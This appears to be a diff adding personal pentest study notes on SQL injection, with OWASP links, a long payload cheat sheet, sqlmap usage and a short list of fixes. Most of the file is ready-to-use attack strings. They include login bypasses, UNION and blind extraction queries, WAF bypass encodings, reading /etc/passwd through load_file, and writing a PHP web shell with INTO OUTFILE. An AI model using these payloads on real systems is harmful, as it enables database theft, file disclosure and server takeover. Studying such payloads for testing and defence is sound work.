@@ -1,0 +1,278 @@
+#gameover.iso - project of collection of vulnerable web applications
+#xvwa - sanoop thomas github
+#pentestermonkey.com
+#https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
+#https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project
+#https://www.owasp.org/index.php/Category:OWASP_Yasca_Project
+#https://www.owasp.org/index.php/Category:OWASP_Tool
+#https://www.owasp.org/index.php/Category:OWASP_Validation_Project
+#https://www.owasp.org/index.php/Category:OWASP_Sprajax_Project
+#https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
+#https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project
+#https://www.owasp.org/index.php/Category:OWASP_Download
+#Web-Hack toolbar for firefox
+#http://www.w3schools.com/sql/sql_injection.asp
+#hashkiller.co.uk
+#www.sqlinjection.net/
+#http://www.thisislegal.com/tutorials/18
+#https://www.owasp.org/images/6/6c/Encoded_Attacks_Threats_Countermeasures_9_30_08.pdf
+
+
+
+1) types of views in oracle db
+2) owasp top 10 2013
+3) owasp testing guide
+4) Injection
+                     
+                    4.1) SQL Injection - Passing sql queries to interpreter without any validations.
+				
+					4.1.1) Vanilla Injection Attack Vector - 
+                                                            
+                                                           Single quote is entered to break the developers code i.e., when passed as string.
+ 							   # - to comment out the erroro created by single quote (syntax error) [for mysql].
+                                                           commenting methods differ for various backend DB.
+                                                      
+						   Syntax --> username: 'or 3=3 #  
+								   
+								   "or"
+
+							      username: abc'or 3=3 #
+
+								   "or"
+
+							      username: ' order by 2#
+
+
+
+                                                  External Sources: 
+
+
+
+To find table name: 
+
+' UNION SELECT table_schema, table_name FROM information_schema.tables#
+
+To find column name:
+
+' UNION SELECT table_name, column_name FROM information_schema.columns#
+
+
+Does the current database contain the letter j?
+    ' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='
+Is there a table called one in database test?
+    ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='
+Is there more than one table in the database(s) containing a j?
+    ' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''=' 
+
+
+
+
+
+
+								 CheatSheet: SQL Injection
+
+	Comments
+	/* – Multi line comment.
+	# – single line comment.
+	-- – single line comment.
+	/*!*/ – Mysql special comments.
+	Whitespaces.
+	+, %2B, %20, %09, %0d ,%0А, /**/, /*foo*/
+	Global system variables
+	@@datadir  // Mysql data directory.
+	@@version_compile_os -  //OS Mysql is running on.
+	@@version – //Mysql database version.
+	user() – //Current database user.
+	@@log_error – //Path to error log.
+	database() – //Current database.
+
+	The INFORMATION_SCHEMA database is made up of the following objects:
+
+	SCHEMATA
+	TABLES
+	COLUMNS
+	STATISTICS
+	USER_PRIVILEGES
+	SCHEMA_PRIVILEGES
+	TABLE_PRIVILEGES
+	COLUMN_PRIVILEGES
+	CHARACTER_SETS
+	COLLATIONS
+	COLLATION_CHARACTER_SET_APPLICABILITY
+	TABLE_CONSTRAINTS
+	KEY_COLUMN_USAGE
+	ROUTINES
+	VIEWS
+	TRIGGERS
+	PROFILING
+
+	 
+
+	Columns in a SELECT.
+	file.php?var=1 order by 10--      //Unknown column ’10′ in ‘order clause’
+	file.php?var=1 and(select * from table)=(1)--   //Operand should contain 9 column(s)
+	Encoding. //For matching collations.
+	file.php?var=1 union select cast(version() as latin1)--  //5.0.11
+	file.php?var=1 union select convert(version() as binary)-- //5.0.11
+	file.php?var=1 union select aes_decrypt(aes_encrypt(version(),1),1)-- //5.0.11
+	file.php?var=1 union select unhex(hex(versions()))-- //5.0.11
+	File_priv.
+	file.php?var=1 union select user()-- //Checking current user. root@localhost
+	file.php?var=1 union select file_priv from mysql.user where user=’root’--  //Checking for the file priveledge on current user, Y =Yes N=No.
+	file.php?var=1 union select load_file(‘/etc/passwd’)--  // Loading system files.
+	file.php?var=1 and+(select+1+from+(select+count(0),concat((select+load_file(‘/etc/passwd’),floor(rand(0)*2))+from+information_schema.tables+group+by+2+limit+1)a)--  // Loading system files with error based injection.
+	file.php?var=1 union select “<?php system($_GET[c]);?>” into outfile ‘/dir/dir/shell.php’--  // Write code to a file.
+	file.php?var=1 limit 1 into outfile ‘/dir/dir/shell.php’ lines terminated by “<?php system($_GET[c]);?>”--+  //Write to a file.
+	WAF & security bypasses.
+	file.php?var=1 /*!union*/ /*select*/ version()-- //MySQL comments.
+	file.php?var=1 unUNIONion seleSELECTct version()-- //Filter bypass
+	file.php?var=1/**/union/**/select/**/version()--  //Whitespace bypass
+	file.php?var=1 UnION SElecT version()--  //Mixed upper/lower
+	file.php?var=1 uni/**/on sel/**/ect version()-- //php comments.
+	file.php?var=1 uni%6Fn select version()-- //URL encoding.
+	file.php?var=1 %252f%252a*/union%252f%252a /select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--  //Taking advantage of a WAF that only decodes input once.
+	file.php?var=1 0×414141414141414141414141414141414141 union select version()--  //Buffer overflow.
+	file.php?var=1 union select 0x3a3a3a--  //Encode to bypass magic quotes.
+	Extracting data from MySQL errors.
+	Rand()
+	file.php?var=1 and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--
+	file.php?var=1 or (select count(*)from(select 1 union select 2 union select 3)x group by concat(mid((select version() from information_schema.tables limit 1),1,64),floor(rand(0)*2)))--
+	file.php?var=1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand(0)*2)) x from (select 1 union select 2)a group by x limit 1) --
+	file.php?var=1 or (select count(*) from table group by concat(version(),floor(rand(0)*2)))--
+	file.php?var=1 union select password from users where id=1 and row(1,1)>(select count(*),concat( (select users.password) ,0x3a,floor(rand()*2)) x from (select 1 union select 2 union select 3)a group by x limit 1) --
+	Name_const(Mysql 5.0.12 > 5.0.64)
+	file.php?var=1 or(1,2)=(select * from(select name_const(version(),1),name_const(version(),1))a)--
+	Extractvalue & updatexml (MySQL 5.1+) file.php?var=1 and extractvalue(rand(),concat(0x3a,version()))--  //Xpath error
+	file.php?var=1 and updatexml(rand(),concat(0x3a,version()))-- //Xpath error
+	Misc.
+	file.php?var=(@:=1)or@ group by concat(@@version,@:=!@)having@||min(0)-- //Credits BlackFan.
+	file.php?var=(@:=9)or@ group by left(@@version,@:=~@)having@||min(0)-- //Credits Blackfan.
+	file.php?var=1 UNION SELECT * FROM (SELECT version() FROM information_schema.tables JOIN information_schema.tables b)a--
+	Injecting into an order byfile.php?var=(select if(substring(version(),1,1)=4,1,(select 1 union select 2)))--
+	file.php?var=1,ExtractValue(1,concat(0x5c,(sele ct table_name from information_schema.tables limit 1)))--
+	Blind.
+	file.php?var=1 and IF(ASCII(SUBSTRING((SELECT version()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW())))-- //time based BSQLi
+	file.php?var=1 and IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3))-- //Time based BSQLi
+	file.php?var=1 AND (SELECT @a:=MID(BIN(FIND_IN_SET(MID(table_name,1,1), ‘a,b,c,d,e,f ,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9,_,!,@,#, $,%,^,&,*,(,),-,+,=,\,,.,”,\’,~,`,\\,|,{,},[,],:,;, ,’)),1,1) FROM in formation_schema.tables LIMIT 1)=@a AND IF(@a!=”,@a,SLEEP(5))--
+	If Statement SQL Injection Attack Samples
+	SELECT IF(user()='root@localhost','true','false') 
+	Load File
+	' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+	Create User
+	CREATE USER username IDENTIFIED BY 'password'; --
+	Drop User
+	DROP USER username; -- 
+	Make user to DBA
+	GRANT ALL PRIVILEGES ON *.* TO username@'%'; 
+	List Users
+
+	    SELECT * FROM 'user' WHERE 1 LIMIT 0,30
+	    SELECT * FROM mysql.user WHERE 1 LIMIT 1,1
+	    SELECT * FROM mysql.user
+
+	Getting user defined tables SELECT table_name FROM information_schema.tables WHERE table_schema = 'tblUsers'
+	Getting Column NamesSELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tblUsers’tblUsers -> tablename
+	SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';
+	find table which have a column called 'username'
+	String without Quotes
+	SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
+	This will return ‘KLM’.
+
+	    Source:  
+
+	    http://www.sqlinjectionwiki.com/Categories.aspx?catId=2 
+
+	    http://slack3rsecurity.wordpress.com/2011/11/14/sql-injection-cheatsheet/
+
+	    http://www.slideshare.net/inquis/sql-injection-not-only-and-11-updated#btnNext
+
+	    http://hakipedia.com/index.php/SQL_Injection 
+
+
+                                                
+
+                                                  Examples:
+
+
+							                -- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
+									' OR '1'='1' --
+									' OR '1'='1' /*
+									-- MySQL
+									' OR '1'='1' #
+									-- Access (using null characters)
+									' OR '1'='1' %00
+									' OR '1'='1' %16
+
+
+
+
+
+				      4.1.2) Blind sql Injection -
+
+							   In Blind sql injection we use 'and' operator and in normal sql injection we use      'or'  operator. We use 'sqlmap tool' is used for blind sql injection mostly.
+
+                                                            Burp Suite is a local interception tool. For INTERCEPTION PURPOSE -GET method- -- Proxy tab --> Intercept tab --> Intercept is on. Then Options tab --> Add proxy listener --> loopback address/my ip --> port number (any). Then Intercept Client request and Intercept Server Response --> check box must be ticked. Then go to Browser --> edit --> preferences --> advanced --> network --> settings -> manual proxy --> loopback ip/my ip & port no. & no proxy for - https://www.gmail.com (optional if you dont want to capture responses from any website)--> click OK.
+
+                                                            Capture the 'Referrer' and 'from id to submit button at the first line or copy from the browser url as the method is GET,nothing to worry abt :) '. Find the 'cookie value in burp suite' to use in 'sqlmap tool'. Go to sqlmap and type --> sqlmap --url="paste the url" --cookie="cookie value" --dbs -D "database name to enumerate" --tables -T "tables to enumerate" --columns --dump-all
+
+                                                            Use 'sqlmap -h' for more help on sqlmap.
+
+						            For INTERCEPTION PURPOSE - POST method -- Same as above.
+
+                                                            Capture the 'Referrer' and 'the url from browser '. Rest steps same as above. Dont forget to add ' --data="the post data at very bottom" ' to sqlmap options.					
+
+
+                                           
+
+                                     4.1.3) Numerical SQL Injection -
+
+                                                             Example : Select * from weather_data where station = 102 
+
+							               Numerical SQL Attcak - Select * from weather_data where station = 102 or 3=3
+
+
+                                                                String based - 
+
+                                                            Example : employee-id=larry & password = ' or 2=2 (in burpsuite intercept mode).
+
+
+ 
+
+Many other vectors are available.
+
+#Refer My github
+
+
+
+Fixes : 
+
+
+  1) Validation --> Blacklisting / Whitelisting (Regex, escaping[eg:-  \']). Whitelisting preferred mostly.
+  2) Parameterized queries to be used. Because they are pre-compiled and treat everything as a string.
+           eg: JAVA - preparedstatements ps = con.preparestatement(select * from users where id = ?);
+            
+                        where '?' --> place holder.
+
+                    if, ps.setInt(1,101) where 1 is the position pointing to 'id' and 101 is the value.
+
+               .NET - SqlCommand is used.
+        
+                PHP - Bind Parameters.
+               
+  3) Stored Procedure to be used. As we know stored procedure as like functions (reusability purpose). They are group of sql queries. They are      	 created at database level. Please note stored procedure with simple statements are vulnerable to sql injection unless validation/parameterized 	 queries are used. By default, stored procedure have only execute rights and not read, update permissions as a normal user, unless permissions   	  are granted.
+
+  4) Use principle of LEAST PRIVILEGE. 
+
+
+Tools
+
+    SQL Power Injector
+    Absinthe :: Automated Blind SQL Injection // ver1.3.1
+    SQLBrute - Multi Threaded Blind SQL Injection Bruteforcer in Python
+    SQLiX - SQL Injection Scanner in Perl
+    sqlmap, automatic SQL injection tool in Python
+    bsqlbf, a blind SQL injection tool in Perl
+
+
+                                       
+							
